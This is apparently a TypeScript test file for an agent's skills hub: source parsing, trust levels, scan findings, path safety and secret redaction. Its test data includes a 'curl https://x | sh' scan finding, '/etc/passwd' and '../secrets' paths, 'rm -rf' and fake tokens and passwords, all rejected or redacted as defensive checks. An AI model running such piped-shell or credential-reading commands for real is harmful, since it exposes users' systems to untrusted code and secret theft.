/**
 * Skills (contracts 0.113, CT-800…CT-805; since 0.125 Hermes's, CT-1210…CT-1213; since 2.0 Hermes's own skills, hub and
 * guard, CT-1400…CT-1409).
 */
import { describe, expect, it } from 'vitest';
import { sha256Hex } from '../audit/crypto.js';
import { SKILL_PROVIDER_FILE, skillContentHash, skillPathProblem } from './files.js';
import { skillBody, skillFrontMatter } from './front-matter.js';
import {
  SCAN_CATEGORY_TEXT,
  SCAN_TRUST_LEVELS,
  SCAN_VERDICTS,
  ScanFinding,
  SKILL_HUB_GITHUB_REPOS,
  SKILL_HUB_SOURCES,
  SKILL_INSTALL_DECISIONS,
  SKILL_TRUST_LEVELS,
  SkillHubIdentifier,
  scanCategoryText,
  skillHubSourceOf,
  skillPolicyReasonText,
} from './hub.js';
import * as skills from './index.js';
import { entropy, literalSecretKind, REDACTED, redactSecrets } from './secrets.js';
import {
  SKILL_ORIGINS,
  SkillCategory,
  SkillCategoryInfo,
  SkillNeeds,
  skillCategoryTitle,
  skillNeedsText,
} from './skill.js';

describe('origins and categories (CT-1400, CT-1401, CT-1570)', () => {
  it('has Hermes’s built-ins, hub skills and learned ones, in one list', () => {
    expect(SKILL_ORIGINS).toEqual(['builtin', 'hub', 'learned']);
    expect('SKILL_SCOPES' in skills).toBe(false);
  });

  it('takes Hermes’s category folders and titles them from the folder’s name', () => {
    for (const c of ['productivity', 'autonomous-ai-agents', 'smart-home', 'mcp', 'note-taking'])
      expect(SkillCategory.safeParse(c).success, c).toBe(true);
    for (const c of ['', 'a/b', '..', '-x', 'x'.repeat(65)])
      expect(SkillCategory.safeParse(c).success, c).toBe(false);
    expect(skillCategoryTitle('autonomous-ai-agents')).toBe('Autonomous AI agents');
    expect(skillCategoryTitle('software-development')).toBe('Software development');
    expect(skillCategoryTitle('mlops')).toBe('MLOps');
    expect(skillCategoryTitle('mcp')).toBe('MCP');
    const info = SkillCategoryInfo.parse({ category: 'media', title: 'Media', description: null });
    expect(info.description).toBeNull();
  });
});

describe('what a skill needs (HSK-10, CT-1402)', () => {
  it('reads Hermes’s front-matter needs as lists, defaulting to none', () => {
    expect(SkillNeeds.parse({})).toEqual({ env: [], commands: [], files: [] });
    const needs = SkillNeeds.parse({
      env: [{ name: 'NOTION_API_KEY' }, { name: 'USDA_API_KEY', optional: true }],
      commands: ['curl', 'jq'],
      files: ['google_token.json'],
    });
    expect(needs.env[0]?.optional).toBe(false);
    expect(SkillNeeds.safeParse({ env: [{ name: 'NOT VALID' }] }).success).toBe(false);
    expect(SkillNeeds.safeParse({ commands: ['rm -rf'] }).success).toBe(false);
    expect(SkillNeeds.safeParse({ files: ['../secrets'] }).success).toBe(false);
  });

  it('says what it needs in words, one line per kind, naming each need', () => {
    expect(skillNeedsText(undefined)).toEqual([]);
    expect(skillNeedsText({})).toEqual([]);
    const lines = skillNeedsText({
      env: [{ name: 'TENOR_API_KEY' }, { name: 'USDA_API_KEY', optional: true }],
      commands: ['curl', 'jq'],
      files: ['google_token.json'],
    });
    expect(lines).toHaveLength(4);
    expect(lines[0]).toContain('TENOR_API_KEY');
    expect(lines[1]).toMatch(/curl.*jq/);
    expect(lines[2]).toContain('google_token.json');
    expect(lines[3]).toContain('USDA_API_KEY');
    expect(lines[3]).not.toMatch(/^Needs/);
  });
});

describe('Hermes’s hub (HSK-06, CT-1405, CT-1406)', () => {
  it('asks three sources, GitHub only in Hermes’s default taps', () => {
    expect(SKILL_HUB_SOURCES).toEqual(['official', 'github', 'skills-sh']);
    expect(SKILL_HUB_GITHUB_REPOS).toEqual([
      'openai/skills',
      'anthropics/skills',
      'huggingface/skills',
      'NVIDIA/skills',
    ]);
    expect(skillHubSourceOf('official/productivity/canvas')).toBe('official');
    expect(skillHubSourceOf('official/mlops/training/axolotl')).toBe('official');
    expect(skillHubSourceOf('openai/skills/skills/.curated/pdf')).toBe('github');
    expect(skillHubSourceOf('nvidia/skills/cuopt')).toBe('github');
    expect(skillHubSourceOf('skills-sh/vercel-labs/agent-skills/web-design')).toBe('skills-sh');
    for (const id of [
      'someone/skills/x',
      'clawhub/x',
      'lobehub/a/b',
      'official/x',
      'skills-sh/a/b',
      'https://example.com/SKILL.md',
      'openai/skills/../x',
    ])
      expect(skillHubSourceOf(id), id).toBeNull();
  });

  it('names a hub skill by a path of safe segments', () => {
    expect(SkillHubIdentifier.safeParse('openai/skills/skills/.curated/pdf').success).toBe(true);
    for (const id of ['pdf', '/a/b', 'a//b', 'a/b/', 'a/./b', 'a/b c', 'a:b/c'])
      expect(SkillHubIdentifier.safeParse(id).success, id).toBe(false);
  });

  it('carries Hermes’s trust levels, verdicts and decisions', () => {
    expect(SKILL_TRUST_LEVELS).toEqual(['builtin', 'trusted', 'community']);
    expect(SCAN_TRUST_LEVELS).toEqual(['builtin', 'trusted', 'community', 'agent-created']);
    expect(SCAN_VERDICTS).toEqual(['safe', 'caution', 'dangerous']);
    expect(SKILL_INSTALL_DECISIONS).toEqual(['allow', 'block']);
  });
});

describe('Hermes’s scan and policy (HSK-07, CT-1407, CT-1408)', () => {
  it('takes Hermes’s findings, any category slug, a line 0 for the folder', () => {
    const finding = {
      patternId: 'curl_pipe_shell',
      severity: 'critical',
      category: 'supply_chain',
      file: 'scripts/setup.sh',
      line: 3,
      match: 'curl https://x | sh',
      description: 'curl piped to a shell',
    };
    expect(ScanFinding.parse(finding)).toEqual(finding);
    expect(ScanFinding.safeParse({ ...finding, category: 'new_kind', line: 0 }).success).toBe(true);
    expect(ScanFinding.safeParse({ ...finding, severity: 'dangerous' }).success).toBe(false);
    expect(ScanFinding.safeParse({ ...finding, match: 'x'.repeat(121) }).success).toBe(false);
  });

  it('words every category Hermes 0.22.5 knows, and anything else as one', () => {
    for (const c of ['exfiltration', 'injection', 'destructive', 'persistence', 'supply_chain', 'structural'])
      expect(scanCategoryText(c)).toBe(SCAN_CATEGORY_TEXT[c]);
    expect(scanCategoryText('constructor')).toBe(scanCategoryText('a_new_one'));
  });

  it('gives each kind of decision its own reason', () => {
    const reasons = new Set([
      skillPolicyReasonText({ verdict: 'safe', trust: 'community', decision: 'allow' }),
      skillPolicyReasonText({ verdict: 'caution', trust: 'trusted', decision: 'allow' }),
      skillPolicyReasonText({ verdict: 'caution', trust: 'builtin', decision: 'allow' }),
      skillPolicyReasonText({ verdict: 'caution', trust: 'community', decision: 'block' }),
      skillPolicyReasonText({ verdict: 'dangerous', trust: 'trusted', decision: 'block' }),
    ]);
    expect(reasons.size).toBe(5);
    for (const r of reasons) expect(r).not.toMatch(/--force|verdict|trust_level/);
  });
});

describe('a skill’s files and front matter (CT-804, CT-1213, CT-1403)', () => {
  it('keeps paths inside the skill and leaves provider files out', () => {
    expect(skillPathProblem('references/api.md')).toBeNull();
    expect(skillPathProblem('a/../../x')).toMatch(/climbs/);
    expect(skillPathProblem('/etc/passwd')).toMatch(/absolute/);
    expect(skillPathProblem('1/2/3/4/5/6/7')).toMatch(/deeper/);
    for (const path of ['hooks/pre.sh', '.claude-plugin/plugin.json', 'x/.mcp.json', 'agents/openai.yaml'])
      expect(SKILL_PROVIDER_FILE.test(path), path).toBe(true);
  });

  it('hashes a version the same whatever the files’ order', () => {
    const files = [
      { path: 'SKILL.md', sha256: sha256Hex('a') },
      { path: 'scripts/run.py', sha256: sha256Hex('b') },
    ];
    expect(skillContentHash(files)).toBe(skillContentHash([...files].reverse()));
    expect(skillContentHash(files)).toMatch(/^[0-9a-f]{64}$/);
  });

  it('reads top-level values the way they were written, and the body apart', () => {
    const text =
      '---\nname: "a"\ndescription: "Say \\"hi\\" twice"\nprerequisites:\n  env_vars: [X]\n---\n# Body\n';
    expect(skillFrontMatter(text)).toEqual({ name: 'a', description: 'Say "hi" twice', prerequisites: '' });
    expect(skillFrontMatter("---\nname: 'it''s'\n---\n")).toEqual({ name: "it's" });
    expect(skillFrontMatter('# no front matter')).toBeNull();
    expect(skillBody(text)).toBe('# Body\n');
  });

  it('no longer has Whombat’s own scanner, `whombat:` line, readiness or import checks', () => {
    for (const name of [
      'scanSkillContent',
      'validateSkill',
      'parseSkillMeta',
      'renderSkillMeta',
      'SKILL_META_KEY',
      'skillReadiness',
      'SKILL_REQUIREMENTS',
      'missingSkillNeeds',
      'serverSkillKinds',
      'SKILL_IMPORT_MAX_BYTES',
      'SKILL_SOURCES',
    ])
      expect(name in skills, name).toBe(false);
  });
});

describe('secrets (CT-417, CT-421)', () => {
  it('finds credential shapes and random keys, not ordinary values, and stays fast on long runs', () => {
    expect(literalSecretKind('ghp_abcdefghijklmnopqrstuvwxyz0123456789')).toBe('a GitHub token');
    expect(literalSecretKind('https://user:hunter2@db.example.com/x')).toBe('a password in a URL');
    expect(literalSecretKind('q8Zr2LmX9vKp4TnW7yHs3JdF6bGc')).toBe('a random-looking key');
    expect(literalSecretKind('/usr/local/bin/mcp-server-filesystem')).toBeNull();
    expect(entropy('aaaa')).toBe(0);
    const started = Date.now();
    expect(literalSecretKind('abcdefgh'.repeat(16_250), { entropy: false })).toBeNull();
    redactSecrets('ab+cd.ef-'.repeat(14_500));
    expect(Date.now() - started).toBeLessThan(1000);
    expect(redactSecrets('git+ssh://deploy:hunter2x@git.example.com/r')).not.toContain('hunter2x');
  });

  it('redacts credential shapes, secret assignments, auth values and URL passwords, not variables', () => {
    const ref = ['$', '{secret:', 'API_TOKEN', '}'].join('');
    expect(redactSecrets('GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789')).toBe(
      `GITHUB_TOKEN=${REDACTED}`,
    );
    expect(redactSecrets('password: hunter22')).toBe(`password: ${REDACTED}`);
    expect(redactSecrets('{"api_key": "abcd1234"}')).toBe(`{"api_key": "${REDACTED}"}`);
    expect(redactSecrets('Authorization: Bearer abcdefgh12345678')).toBe(`Authorization: Bearer ${REDACTED}`);
    expect(redactSecrets('https://admin:hunter22@db.example.com/x')).toBe(
      `https://admin:${REDACTED}@db.example.com/x`,
    );
    expect(redactSecrets('curl -u admin:hunter22 https://x')).toBe(`curl -u admin:${REDACTED} https://x`);
    expect(redactSecrets('q8Zr2LmX9vKp4TnW7yHs3JdF6bGc')).toBe(REDACTED);
    expect(redactSecrets(`key ${'ab12'.repeat(10)}`)).toBe(`key ${REDACTED}`);
    expect(redactSecrets('curl -d "$API_KEY" https://x')).toBe('curl -d "$API_KEY" https://x');
    expect(redactSecrets(`TOKEN=${ref}`)).toBe(`TOKEN=${ref}`);
    expect(redactSecrets('rm -rf node_modules')).toBe('rm -rf node_modules');
  });
});
